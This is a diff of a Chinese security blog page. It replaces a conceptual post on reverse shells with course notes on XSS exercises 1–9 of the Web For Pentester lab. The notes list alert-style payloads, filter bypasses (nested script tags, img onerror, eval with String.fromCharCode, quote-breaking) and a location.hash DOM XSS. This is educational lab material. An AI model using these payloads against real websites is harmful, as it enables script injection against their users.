@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="反弹shell,">
+  <meta name="keywords" content="Hexo, NexT">
 
 
 
@@ -79,18 +79,17 @@
 
 
 
-<meta name="description" content="想要搞清楚这个问题，首先要搞清楚什么是反弹，为什么要反弹。假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。 那么什么情况下正向连接不太好用了呢？1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。它的ip会动态改变，你不能持续控制。">
-<meta name="keywords" content="反弹shell">
+<meta name="description" content="说明 Web For Pentester 平台 针对Xss-Example 1-10 写这篇文章我用\转义html标签，因为这篇文章用markdown写的">
 <meta property="og:type" content="article">
-<meta property="og:title" content="关于反弹Shell的理解">
-<meta property="og:url" content="http://www.rlovey.fun/2019/04/20/Rebound-shell/index.html">
+<meta property="og:title" content="security-1 Xss练习笔记">
+<meta property="og:url" content="http://www.rlovey.fun/2019/04/28/security-1/index.html">
 <meta property="og:site_name" content="ren.blog">
-<meta property="og:description" content="想要搞清楚这个问题，首先要搞清楚什么是反弹，为什么要反弹。假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。 那么什么情况下正向连接不太好用了呢？1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。它的ip会动态改变，你不能持续控制。">
+<meta property="og:description" content="说明 Web For Pentester 平台 针对Xss-Example 1-10 写这篇文章我用\转义html标签，因为这篇文章用markdown写的">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-04-27T11:59:27.774Z">
+<meta property="og:updated_time" content="2019-04-28T13:52:49.924Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="关于反弹Shell的理解">
-<meta name="twitter:description" content="想要搞清楚这个问题，首先要搞清楚什么是反弹，为什么要反弹。假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。 那么什么情况下正向连接不太好用了呢？1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。它的ip会动态改变，你不能持续控制。">
+<meta name="twitter:title" content="security-1 Xss练习笔记">
+<meta name="twitter:description" content="说明 Web For Pentester 平台 针对Xss-Example 1-10 写这篇文章我用\转义html标签，因为这篇文章用markdown写的">
 
 
 
@@ -120,13 +119,13 @@
 
 
 
-  <link rel="canonical" href="http://www.rlovey.fun/2019/04/20/Rebound-shell/">
+  <link rel="canonical" href="http://www.rlovey.fun/2019/04/28/security-1/">
 
 
 
 
 
-  <title>关于反弹Shell的理解 | ren.blog</title>
+  <title>security-1 Xss练习笔记 | ren.blog</title>
   
 
 
@@ -295,7 +294,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.rlovey.fun/2019/04/20/Rebound-shell/">
+    <link itemprop="mainEntityOfPage" href="http://www.rlovey.fun/2019/04/28/security-1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="任小昊">
@@ -312,7 +311,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">关于反弹Shell的理解</h1>
+          <h1 class="post-title" itemprop="name headline">security-1 Xss练习笔记</h1>
         
 
         <div class="post-meta">
@@ -324,8 +323,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-20T16:43:00+08:00">
-                2019-04-20
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-28T21:51:46+08:00">
+                2019-04-28
               </time>
             
 
@@ -340,12 +339,34 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-04-27T19:59:27+08:00">
-                2019-04-27
+              <time title="更新于" itemprop="dateModified" datetime="2019-04-28T21:52:49+08:00">
+                2019-04-28
               </time>
             
           </span>
 
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/网络安全课程笔记/" itemprop="url" rel="index">
+                    <span itemprop="name">网络安全课程笔记</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -355,8 +376,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2019/04/20/Rebound-shell/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/2019/04/20/Rebound-shell/" itemprop="commentCount"></span>
+                <a href="/2019/04/28/security-1/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2019/04/28/security-1/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -378,7 +399,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  294
+                  629
                 </span>
               
 
@@ -403,8 +424,67 @@
       
 
       
-        <p>想要搞清楚这个问题，首先要搞清楚什么是反弹，为什么要反弹。<br>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。</p>
-<p>那么什么情况下正向连接不太好用了呢？<br>1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。它的ip会动态改变，你不能持续控制。<br>2.由于防火墙等限制，对方机器只能发送请求，不能接收请求。<br>3.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。<br>那么反弹就很好理解了， 攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p>
+        <h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><ul>
+<li>Web For Pentester 平台 针对Xss-Example 1-10</li>
+<li>写这篇文章我用\转义html标签，因为这篇文章用markdown写的<a id="more"></a>
+</li>
+</ul>
+<p>参考网站：</p>
+<ul>
+<li><a href="https://blog.csdn.net/shinpachi8/article/details/54425439" target="_blank" rel="noopener">https://blog.csdn.net/shinpachi8/article/details/54425439</a></li>
+<li><a href="https://blog.csdn.net/qq_20307987/article/details/51284169" target="_blank" rel="noopener">https://blog.csdn.net/qq_20307987/article/details/51284169</a></li>
+<li><a href="https://blog.csdn.net/weixin_40871137/article/details/81706515" target="_blank" rel="noopener">https://blog.csdn.net/weixin_40871137/article/details/81706515</a></li>
+</ul>
+<h1 id="Web-For-Pentester"><a href="#Web-For-Pentester" class="headerlink" title="Web For Pentester"></a>Web For Pentester</h1><h2 id="XSS-Example-1"><a href="#XSS-Example-1" class="headerlink" title="XSS-Example 1"></a>XSS-Example 1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;\script&gt; alert(1) &lt;\/script&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="XSS-Example-2"><a href="#XSS-Example-2" class="headerlink" title="XSS-Example 2"></a>XSS-Example 2</h2><ul>
+<li>进行了一些过滤，script标签被过滤掉了</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;\sc&lt;\script&gt;ript&gt; alert(1) &lt;\/sc&lt;\/script&gt;ript&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="XSS-Example-3"><a href="#XSS-Example-3" class="headerlink" title="XSS-Example 3"></a>XSS-Example 3</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;-sc&lt;-script&gt;ript&gt; alert(1) &lt;-/sc&lt;-/script&gt;ript&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="XSS-Example-4"><a href="#XSS-Example-4" class="headerlink" title="XSS-Example 4"></a>XSS-Example 4</h2><ul>
+<li>在本例中，script被完全列入黑名单，如果请求中包含script脚本，则停止执行</li>
+<li>这时候需要用img标签</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;\img src=liu.jpg onerror=alert(&quot;xss&quot;)&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="XSS-Example-5"><a href="#XSS-Example-5" class="headerlink" title="XSS-Example 5"></a>XSS-Example 5</h2><ul>
+<li>在本例中，alert被过滤了，只要带alert，页面会返回error</li>
+<li>使用JavaScript的eval和String.fromCharCode()，在不直接使用alert这个单词的情况下得到一个警告框fromcharcode()将把一个整数(十进制值)解码为对应的字符</li>
+<li>可使用的方法如下</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;\img src=liu.jpg onerror=prompt(&apos;1&apos;)&gt;</span><br><span class="line">&lt;\img src=liu.jpg onerror=confirm(&apos;1&apos;)&gt;</span><br><span class="line">&lt;\script&gt;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&lt;\/script&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>fromCharCode() 可接受一个指定的 Unicode 值，然后返回一个字符串,题目中<br>String.fromCharCode(97,108,101,114,116,40,49,41)<br>相当于alert(1)</li>
+<li>eval()是程序语言中的函数，功能是获取返回值，不同语言大同小异，函数原型是返回值 = eval( codeString )，如果eval函数在执行时遇到错误，则抛出异常给调用者</li>
+</ul>
+<h2 id="XSS-Example-6"><a href="#XSS-Example-6" class="headerlink" title="XSS-Example 6"></a>XSS-Example 6</h2><ul>
+<li>查看源代码<br>发现将输入到url的脚本输出到</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var $a= &quot;hacker&lt;\script&gt;alert(1)&lt;\/script&gt;&quot;;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>利用javascipt语法<br>闭合前面的”;<br>中间加上语句alert(1);<br>结束注释后面的分号//</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;alert(1);//</span><br></pre></td></tr></table></figure>
+<h2 id="XSS-Example-7"><a href="#XSS-Example-7" class="headerlink" title="XSS-Example 7"></a>XSS-Example 7</h2><ul>
+<li>和Example相似</li>
+<li>不同之处在与闭合是单引号</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;;alert(1);//</span><br></pre></td></tr></table></figure>
+<h2 id="XSS-Example-8"><a href="#XSS-Example-8" class="headerlink" title="XSS-Example 8"></a>XSS-Example 8</h2><ul>
+<li>在表单中的&lt;都被转义，查看源代码可看到效果</li>
+<li>在url中闭合from标签，可实现xss</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/&quot;&gt;&lt;\script&gt;alert(1)&lt;\/script&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="XSS-Example-9"><a href="#XSS-Example-9" class="headerlink" title="XSS-Example 9"></a>XSS-Example 9</h2><ul>
+<li>hash 属性是一个可读可写的字符串，该字符串是 URL 的锚部分（从 # 号开始的部分）</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">location.hash</span><br><span class="line">location.hash.substring(1) //从#后第一个字符开始读取</span><br></pre></td></tr></table></figure>
+<p>因此payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example9.php#&lt;\script&gt;alert(1)&lt;\/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p><strong> 注意 :</strong></p>
+<ul>
+<li>博主用的ie浏览器可以实验成功</li>
+<li>火狐和谷歌浏览器都会对&lt;转码如下：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%3Cscript%3Ealert(1)%3C/script%3E</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -420,12 +500,6 @@
 
     <footer class="post-footer">
       
-        <div class="post-tags">
-          
-            <a href="/tags/反弹shell/" rel="tag"># 反弹shell</a>
-          
-        </div>
-      
 
       
       
@@ -435,8 +509,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/04/20/Metasploit-6-2/" rel="next" title="Metasploit-6-2 web应用渗透之漏洞扫描神器W3AF">
-                <i class="fa fa-chevron-left"></i> Metasploit-6-2 web应用渗透之漏洞扫描神器W3AF
+              <a href="/2019/04/27/Hexo-2/" rel="next" title="Hexo-2 Hexo主题设置">
+                <i class="fa fa-chevron-left"></i> Hexo-2 Hexo主题设置
               </a>
             
           </div>
@@ -444,10 +518,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/04/20/Http-status/" rel="prev" title="Http常见状态码含义">
-                Http常见状态码含义 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -502,8 +572,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -581,6 +660,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#说明"><span class="nav-number">1.</span> <span class="nav-text">说明</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web-For-Pentester"><span class="nav-number">2.</span> <span class="nav-text">Web For Pentester</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-Example-1"><span class="nav-number">2.1.</span> <span class="nav-text">XSS-Example 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-Example-2"><span class="nav-number">2.2.</span> <span class="nav-text">XSS-Example 2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-Example-3"><span class="nav-number">2.3.</span> <span class="nav-text">XSS-Example 3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-Example-4"><span class="nav-number">2.4.</span> <span class="nav-text">XSS-Example 4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-Example-5"><span class="nav-number">2.5.</span> <span class="nav-text">XSS-Example 5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-Example-6"><span class="nav-number">2.6.</span> <span class="nav-text">XSS-Example 6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-Example-7"><span class="nav-number">2.7.</span> <span class="nav-text">XSS-Example 7</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-Example-8"><span class="nav-number">2.8.</span> <span class="nav-text">XSS-Example 8</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-Example-9"><span class="nav-number">2.9.</span> <span class="nav-text">XSS-Example 9</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
